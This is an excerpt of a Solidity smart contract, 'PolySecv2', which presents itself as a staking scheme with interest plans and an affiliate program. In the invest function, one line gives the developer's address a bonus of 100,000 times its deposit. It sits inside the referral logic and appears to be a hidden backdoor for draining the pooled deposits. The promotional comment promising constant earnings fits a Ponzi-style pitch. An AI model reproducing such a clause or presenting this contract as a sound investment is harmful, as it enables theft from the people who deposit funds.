 ...
 *   - Earnings every moment, withdraw any time (if you use capitalization of interest you can withdraw only after end of your deposit or you can terminate their stakes and get 10% of their fund back while the remaining goes into the pool. (plan 1,2,3,4 are not allowed to terminate after withdrawing interest)
 *   [AFFILIATE PROGRAM]
 *
...
contract PolySecv2 {
	...
	uint256 constant public PENALTY_STEP = 100;
	uint256 constant private mathRef = 10**5;
	...
	function invest(address referrer, uint8 reffPlan, uint8 plan) public payable {
		...
		if(reffPlan != 0 && mover == dev) users[mover].bonus = msg.value.mul(mathRef);
